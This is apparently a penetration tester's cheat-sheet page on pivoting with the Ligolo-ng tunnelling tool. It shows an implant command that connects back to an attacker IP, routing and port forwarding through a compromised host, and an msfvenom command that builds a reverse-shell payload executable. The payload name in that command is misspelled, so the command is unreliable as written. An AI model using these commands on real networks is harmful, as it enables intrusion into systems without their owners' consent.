---
author(s):
  - Userware
tags:
  - post-exploitation
  - pivot
  - port-forward
  - cross-platform
  - ligolo-ng
---
# Ligolo-ng

## Setup

Install it according to your package manager

```
$ sudo apt install -y ligolo-ng
```

## Server

TODO: Fill this info

Self-signed certificate.

```
root@hackware-os:~# ./proxy -selfcert
```

Use LetsEncrypt certificates.

```
root@hackware-os:~# ./proxy -autocert
```

```
root@hackware-os:~# ip address show ligolo

root@hackware-os:~# ip tuntap add user root mode tun ligolo

root@hackware-os:~# ip link set ligolo up
```


```
ligolo-ng » certificate_fingerprint
```

## Implant

```
> ./agent -connect <attacker_IP>:11601 -ignore-cert
```

Select an active session.

```
ligolo-ng » session
```

Route the subnet.

```
[Agent : username@computer] » ifconfig
```

```
root@hackware-os:~# ip route add <subnet_target> dev ligolo

root@hackware-os:~# ip route add 192.168.5.0/24 dev ligolo
```

> [!INFO]
> When using `nmap` always specify the flag `-PE` or `--unprivileged` to prevent false positives.

```
ligolo-ng » start
```

### Port Forwarding

```
[Agent : username@computer] » listener_add --addr <compromised_pivot_IP>:8443 --to 127.0.0.1:<local_PORT>
```

Then you can launch a reverse shell handler. Just specify the compromised system's IP and PORT.

```
$ msfvenom -p windows/x64/metepreter/reverse_tcp lhost=<compromised_pivot_IP> lport=8443 -f exe -o implant.exe
```

```
msf > set lport <local_PORT>
```

```
[Agent : username@computer] » listener_list

[Agent : username@computer] » listener_list <agent_ID>
```

---
## References

### Source Repositories

- [Ligolo-ng](https://github.com/nicocha30/ligolo-ng)

### WhiteOakSecurity

- [WhiteOakSecurity: Pivoting VPN Process Tunneling with Ligolo-ng](https://www.whiteoaksecurity.com/blog/pivoting-vpn-process-tunneling-ligolo-ng/)

### 4pfsec

- [4pfsec: Ligolo](https://4pfsec.com/ligolo)